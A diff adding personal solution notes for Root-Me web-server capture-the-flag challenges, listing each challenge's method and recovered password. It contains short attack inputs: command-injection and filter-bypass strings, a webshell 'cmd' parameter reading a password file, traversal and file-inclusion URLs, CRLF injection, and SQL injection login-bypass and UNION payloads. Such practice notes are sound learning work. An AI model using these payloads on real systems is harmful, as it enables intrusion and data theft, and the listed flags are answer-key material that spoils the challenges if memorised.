@@ -1,0 +1,118 @@
+https://www.root-me.org/en/Challenges/Web-Server/
+HTML:
+    See source code
+    Password: nZ^&@q5&sjJHev0
+
+HTTP - Open redirect:
+    2.py
+    Password: e6f8a530811d5a479812d7b82fc1a5c5
+
+Command injection:
+    127.0.0.1;cat index.php
+    See html: $flag = "S3rv1ceP1n9Sup3rS3cure";
+    Password: S3rv1ceP1n9Sup3rS3cure
+
+Weak password:
+    admin - admin
+    Password: admin
+
+User-Agent:
+    5.py
+    Password: rr$Li9%L34qd1AAe27
+
+Backup File:
+    running dirbuster currently
+
+HTTP-POST:
+    7.py
+    Password: H7tp_h4s_N0_s3Cr37S_F0r_y0U
+
+HTTP directory indexing:
+    http://challenge01.root-me.org/web-serveur/ch4/admin/
+    http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt
+    password: LINUX
+
+HTTP Headers:
+    8.py
+    Password: HeadersMayBeUseful
+
+HTTP verb tampering:
+    9.py
+    Password: a23e$dme96d3saez$$prap
+
+Install files:
+    phpbb installing.
+    Googling gave me /phpbb.
+    More google searches gave me phpbb/install
+    which gave me php/install/install.php
+    karambar
+
+Improper redirect:
+    11.py
+    Password: ExecutionAfterRedirectIsBad
+
+CRLF:
+    http://challenge01.root-me.org/web-serveur/ch14/?username=admin%20authenticated.%0D%0Aadmin&password=a
+    Password: rFSP&G0p&5uAg1%
+File upload - double extensions
+    Upload file: 13.php.png
+    ?cmd=cat%20../../../.passwd
+    Password: Gg9LRz-hWSxqqUKd77-_q-6G8
+
+HTTP Cookies:
+    document.cookie="ch7=admin";
+    Password: ml-SYMPA
+
+Directory traversal:
+    http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=../
+    http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=../galerie
+    http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=../galerie/86hwnX2r/password.txt
+    http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt
+    Password: kcb$!Bx@v4Gs9Ez
+
+PHP Register Globals:
+    
+    Notes:
+        No quotation marks.
+        No need for $ as it's just PHP syntax to declare a variable.
+    index.php?_SESSION[logged]=1
+
+    Password: NoTQYipcRKkgrqG
+
+Local File Inclusion:
+    http://challenge01.root-me.org/web-serveur/ch16/?files=../
+    http://challenge01.root-me.org/web-serveur/ch16/?files=../admin
+    http://challenge01.root-me.org/web-serveur/ch16/?files=../admin&f=index.php
+
+    Password: OpbNJ60xYpvAQU8
+
+Command injection - Filter bypass:
+    1. 127.0.0.1; # asdasdasdsasdasdasdasdasdsadasdasdasdasdasdasdasdsadasdsadasdsadasdsdasdasdsadsdsdas
+        works, no limit on input length
+    2. 127.0.0.1;\
+        works without problems
+    3. 127.0.0.1; # cat ls cat index.php && | > < $(cat index.php)
+        works
+    4. $(echo 127.0.0.1)
+        does not work
+    
+    5. Last commmand injection:
+        timeout 5 bash -c 'ping -c 3 "127.0.0.1"'
+    6. 127.0.0.1' #
+        works
+    7. 127.0.0.1' && cat index.php #
+        works, only says "Ping OK"
+    8. 127.0.0.1' && cat index.php > a.txt #
+        a.txt = 404
+    9. 127.0.0.1'; \ cat index.php # 
+        works, only says "Ping OK"
+
+SQL injection - authentication:
+    See: sqli_authentication.sql
+    a' or 1=1 ORDER BY username ASC; --
+    Password: t0_W34k!$
+
+SQL injection - string:
+    See: sqli_string.sql
+    recherche' or description LIKE '%' union select username,password from 'users';--
+    Password: c4K04dtIaJsuWdi
